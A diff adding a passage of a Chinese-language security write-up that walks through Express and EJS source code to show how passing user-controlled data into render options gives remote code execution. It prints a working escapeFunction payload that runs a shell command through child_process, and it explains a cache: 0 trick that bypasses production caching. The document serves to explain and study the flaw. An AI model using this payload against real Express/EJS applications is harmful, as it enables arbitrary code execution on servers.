@@ -1,0 +1,300 @@
+``` js
+app.render = function render(name, options, callback) {
+  var cache = this.cache;
+  var done = callback;
+  var engines = this.engines;
+  var opts = options;
+  var renderOptions = {};
+  var view;
+
+  // support callback function as second arg
+  if (typeof options === 'function') {
+    done = options;
+    opts = {};
+  }
+
+  // merge app.locals
+  merge(renderOptions, this.locals);
+
+  // merge options._locals
+  if (opts._locals) {
+    merge(renderOptions, opts._locals);
+  }
+
+  // merge options
+  merge(renderOptions, opts);
+
+  // set .cache unless explicitly provided
+  if (renderOptions.cache == null) {
+    renderOptions.cache = this.enabled('view cache');
+  }
+
+  // primed cache
+  if (renderOptions.cache) {
+    view = cache[name];
+  }
+
+  // view
+  if (!view) {
+    var View = this.get('view');
+
+    view = new View(name, {
+      defaultEngine: this.get('view engine'),
+      root: this.get('views'),
+      engines: engines
+    });
+
+    if (!view.path) {
+      var dirs = Array.isArray(view.root) && view.root.length > 1
+        ? 'directories "' + view.root.slice(0, -1).join('", "') + '" or "' + view.root[view.root.length - 1] + '"'
+        : 'directory "' + view.root + '"'
+      var err = new Error('Failed to lookup view "' + name + '" in views ' + dirs);
+      err.view = view;
+      return done(err);
+    }
+
+    // prime the cache
+    if (renderOptions.cache) {
+      cache[name] = view;
+    }
+  }
+
+  // render
+  tryRender(view, renderOptions, done);
+};
+```
+
+這邊最後會呼叫 `tryRender`，程式碼在[express/lib/application.js](https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L655)：
+
+``` js
+function tryRender(view, options, callback) {
+  try {
+    view.render(options, callback);
+  } catch (err) {
+    callback(err);
+  }
+}
+```
+
+這個 `view.render` 會去呼叫 view engine 裡面的 `__express` 方法，而這個方法在 EJS 裡面就是 `renderFile`：
+
+[ejs/lib/ejs.js](https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L926)：
+
+``` js
+/**
+ * Express.js support.
+ *
+ * This is an alias for {@link module:ejs.renderFile}, in order to support
+ * Express.js out-of-the-box.
+ *
+ * @func
+ */
+
+exports.__express = exports.renderFile;
+```
+
+[renderFile](https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#441)：
+
+``` js
+exports.renderFile = function () {
+  var args = Array.prototype.slice.call(arguments);
+  var filename = args.shift();
+  var cb;
+  var opts = {filename: filename};
+  var data;
+  var viewOpts;
+
+  // Do we have a callback?
+  if (typeof arguments[arguments.length - 1] == 'function') {
+    cb = args.pop();
+  }
+  // Do we have data/opts?
+  if (args.length) {
+    // Should always have data obj
+    data = args.shift();
+    // Normal passed opts (data obj + opts obj)
+    if (args.length) {
+      // Use shallowCopy so we don't pollute passed in opts obj with new vals
+      utils.shallowCopy(opts, args.pop());
+    }
+    // Special casing for Express (settings + opts-in-data)
+    else {
+      // Express 3 and 4
+      if (data.settings) {
+        // Pull a few things from known locations
+        if (data.settings.views) {
+          opts.views = data.settings.views;
+        }
+        if (data.settings['view cache']) {
+          opts.cache = true;
+        }
+        // Undocumented after Express 2, but still usable, esp. for
+        // items that are unsafe to be passed along with data, like `root`
+        viewOpts = data.settings['view options'];
+        if (viewOpts) {
+          utils.shallowCopy(opts, viewOpts);
+        }
+      }
+      // Express 2 and lower, values set in app.locals, or people who just
+      // want to pass options in their data. NOTE: These values will override
+      // anything previously set in settings  or settings['view options']
+      utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
+    }
+    opts.filename = filename;
+  }
+  else {
+    data = utils.createNullProtoObjWherePossible();
+  }
+
+  return tryHandleCache(opts, data, cb);
+};
+```
+
+這邊的重點是中間那段：
+
+``` js
+if (data.settings) {
+  // Pull a few things from known locations
+  if (data.settings.views) {
+    opts.views = data.settings.views;
+  }
+  if (data.settings['view cache']) {
+    opts.cache = true;
+  }
+  // Undocumented after Express 2, but still usable, esp. for
+  // items that are unsafe to be passed along with data, like `root`
+  viewOpts = data.settings['view options'];
+  if (viewOpts) {
+    utils.shallowCopy(opts, viewOpts);
+  }
+}
+```
+
+簡單來說，設置 `data.settings['view options']` 就可以蓋掉 `opts`。
+
+再來一路往下追會到 `handleCache`：
+
+``` js
+function handleCache(options, template) {
+  var func;
+  var filename = options.filename;
+  var hasTemplate = arguments.length > 1;
+
+  if (options.cache) {
+    if (!filename) {
+      throw new Error('cache option requires a filename');
+    }
+    func = exports.cache.get(filename);
+    if (func) {
+      return func;
+    }
+    if (!hasTemplate) {
+      template = fileLoader(filename).toString().replace(_BOM, '');
+    }
+  }
+  else if (!hasTemplate) {
+    // istanbul ignore if: should not happen at all
+    if (!filename) {
+      throw new Error('Internal EJS error: no file name or template '
+                    + 'provided');
+    }
+    template = fileLoader(filename).toString().replace(_BOM, '');
+  }
+  func = exports.compile(template, options);
+  if (options.cache) {
+    exports.cache.set(filename, func);
+  }
+  return func;
+}
+```
+
+如果 `options.cache` 有設置，那就直接用 cache 裡已經 compile 過的東西，否則就重新 compile 一次。
+
+而最後重點中的重點就是 [compile](https://github.com/mde/ejs/blob/v3.1.9/lib/ejs.js#L571)，裡面有一段如下：
+
+``` js
+if (opts.client) {
+  src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;
+  if (opts.compileDebug) {
+    src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;
+  }
+}
+```
+
+會拿 `escapeFn` 去拼接程式碼。
+
+於是我們只要傳入：
+
+``` js
+const payload = {
+  settings: {
+    'view options': {
+      client: true,
+      escapeFunction: '(() => {});return process.mainModule.require("child_process").execSync("id").toString()'
+    }
+  }
+}
+```
+
+就可以執行任意程式碼，達成 RCE。
+
+## Cache 的問題
+
+雖然前面講的很順，但是有一個 cache 的問題。
+
+在 production 模式底下 view cache 會[自動啟用](https://github.com/expressjs/express/blob/4.18.2/lib/application.js#L126)：
+
+``` js
+if (env === 'production') {
+  this.enable('view cache');
+}
+```
+
+而這個參數在 render 的時候會自動被帶到 options 裡面：
+
+``` js
+// set .cache unless explicitly provided
+if (renderOptions.cache == null) {
+  renderOptions.cache = this.enabled('view cache');
+}
+```
+
+雖然說我們可以透過 view options 覆蓋原本的 options，但如果原本 options 內就有傳入 cache 的話，又會被覆蓋回去：
+
+``` js
+utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS);
+```
+
+如果無法覆蓋 cache，那就不能使用上面的方法了，因為 template 不會重新被 compile。
+
+不過沒關係，幸好這是 JavaScript，注意這行程式碼：
+
+``` js
+if (renderOptions.cache == null) {
+  renderOptions.cache = this.enabled('view cache');
+}
+```
+
+如果 `renderOptions.cache` 是 null 的話才會去設置，而 `0 == null` 是 false，所以我們可以傳入 `cache: 0`，就不會進去這一段。
+
+而 `0` 是 falsy，所以可以繞過 cache 的檢查，讓 `if (options.cache)` 是 false。
+
+## EJS 作者的看法
+
+其實 EJS 從以前就有不少相關的 issue 了，清單如下：
+
+* [Unrestricted render option may lead to a RCE vulnerability #451](https://github.com/mde/ejs/issues/451)
+* [Mitigate prototype pollution effects #601](https://github.com/mde/ejs/pull/601)
+* [[Vulnerability] Server side template injection leads to RCE #663](https://github.com/mde/ejs/issues/663)
+* [EJS, Server side template injection ejs@3.1.9 Latest #720](https://github.com/mde/ejs/issues/720)
+* [EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) #735](https://github.com/mde/ejs/issues/735)
+
+而作者的立場從以前到現在都一樣：
+
+> The problem here is that EJS is simply a way of executing JS to render a template. If you allow passing of arbitrary/unsanitized options and data to the render function, you will encounter all security problems that would occur as a result of arbitrary code execution. Henny Youngman used to tell a joke: "The patient says, 'Doctor, it hurts when I do this.' So the doctor says, 'Then don't do that!'" I'm open to PRs that improve security, but this looks to me to be far beyond the purview of the library. These responsibilities live squarely in userland.
+
+主要就是說如果開發者自己要這樣用 library 的話他也沒辦法，這不是 EJS 應該負責的，不該讓 end user 可以傳入整個 object。
+
+而 EJS 的開發者最近也因為收到很多這類型的 issue report，直接在 README 以及官網上面都加上了告示：
+
+> Security professionals, before reporting any security issues, please reference the SECURITY.md in this project, in particular, the following: "EJS is effectively a JavaScript runtime. Its entire job is to execute JavaScript. If you run the EJS render method without checking the inputs yourself, you are responsible for the results."
